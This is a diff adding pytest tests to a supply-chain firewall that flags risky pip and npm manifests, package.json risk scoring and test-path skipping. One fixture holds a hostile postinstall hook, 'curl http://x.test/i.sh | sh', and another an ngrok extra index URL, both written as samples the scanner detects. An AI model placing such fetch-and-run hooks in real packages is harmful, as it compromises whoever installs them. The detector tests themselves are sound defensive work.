@@ -727,3 +727,100 @@ def test_yaml_config_flag_actually_changes_standalone_firewall_behavior(tmp_path
             "supply_chain_firewall.py main() -- the #332/#335 reachability "
             "gap is still open."
         )
+
+
+# ==============================================================================
+# #8432: manifest flags, package.json hooks, anchored test-path skip
+# ==============================================================================
+def test_manifest_flags_are_threats_with_near_misses(tmp_path):
+    from gitgalaxy.security.manifest_parser import ManifestParser
+
+    bad = tmp_path / "bad"
+    ok = tmp_path / "ok"
+    bad.mkdir()
+    ok.mkdir()
+    (bad / "pip.conf").write_text(
+        "[global]\nindex-url = http://example.test/simple\nextra-index-url = https://abc.ngrok.io/s\n"
+    )
+    (bad / "requirements.txt").write_text("git+https://example.test/x.git\nrequests==2.0\n")
+    (bad / "package.json").write_text(
+        json.dumps(
+            {
+                "dependencies": {"a": "file:./local", "b": "github:u/r"},
+                "scripts": {"postinstall": "curl http://x.test/i.sh | sh", "build": "tsc"},
+            }
+        )
+    )
+    (ok / "package.json").write_text(
+        json.dumps({"dependencies": {"a": "^1.0.0"}, "scripts": {"build": "tsc", "postinstall": "node-gyp rebuild"}})
+    )
+    (ok / "requirements.txt").write_text("requests==2.0\n")
+    amap = ManifestParser().build_resolution_map(
+        [
+            str(p)
+            for p in (
+                bad / "pip.conf",
+                bad / "requirements.txt",
+                bad / "package.json",
+                ok / "package.json",
+                ok / "requirements.txt",
+            )
+        ]
+    )
+    kinds = {k for d, k, _ in firewall_module.manifest_flag_findings(amap) if d == str(bad).replace("\\", "/")}
+    assert kinds == {"insecure_registry", "direct_reference", "install_hook"}
+    assert not [f for f in firewall_module.manifest_flag_findings(amap) if f[0] == str(ok).replace("\\", "/")]
+
+    config = _make_config()
+    assert (
+        firewall_module.run_firewall_audit([], alias_map=amap, config=config)["threats_found"] == 0
+    )  # empty graph short-circuits
+    result = firewall_module.run_firewall_audit(
+        [{"path": "x.py", "raw_imports": [], "risk_vector": _risk_vector()}], alias_map=amap, config=config
+    )
+    assert result["threats_found"] >= 3
+    clean = firewall_module.run_firewall_audit(
+        [{"path": "x.py", "raw_imports": [], "risk_vector": _risk_vector()}],
+        alias_map={k: v for k, v in amap.items() if k == str(ok).replace("\\", "/")},
+        config=config,
+    )
+    assert clean["threats_found"] == 0
+    allowed = firewall_module.run_firewall_audit(
+        [{"path": "x.py", "raw_imports": [], "risk_vector": _risk_vector()}],
+        alias_map=amap,
+        config=_make_config(ALLOWLIST_PATHS=[str(bad).replace("\\", "/") + "/**", str(bad).replace("\\", "/")]),
+    )
+    assert allowed["threats_found"] == 0 and allowed["threats_allowed"] >= 3
+
+
+def test_package_json_is_not_shielded_and_gets_build_multiplier():
+    # 6.0 * 10 = 60 >= 50; a plain .json with the same score stays shielded.
+    node = {"raw_imports": [], "risk_vector": _risk_vector(secrets_risk=6.0)}
+    config = _make_config()
+    hit = firewall_module.run_firewall_audit([{**node, "path": "pkg/package.json"}], config=config)
+    miss = firewall_module.run_firewall_audit([{**node, "path": "pkg/data.json"}], config=config)
+    assert hit["threats_found"] == 1
+    assert miss["threats_found"] == 0
+
+
+@pytest.mark.parametrize(
+    "path,skipped",
+    [
+        ("src/helper_test.py", False),  # name alone never skips
+        ("tests/test_x.py", True),
+        ("src/test_x.py", False),
+        ("pkg/test/a.py", True),
+        ("src/contest.py", False),
+        ("src/latest_data.py", False),
+        ("src/testing_utils/a.py", False),  # directory merely starts with "test"
+        ("src/attest.py", False),
+        ("src/a_test_helper.py", False),
+        ("src/mytests/a.py", False),
+    ],
+)
+def test_test_path_skip_is_anchored(path, skipped):
+    assert firewall_module._is_test_path(path) is skipped
+    # And end to end: a hot payload is gated exactly when the path is not a test path.
+    node = {"path": path, "raw_imports": [], "risk_vector": _risk_vector(secrets_risk=90.0)}
+    result = firewall_module.run_firewall_audit([node], config=_make_config())
+    assert result["threats_found"] == (0 if skipped else 1)
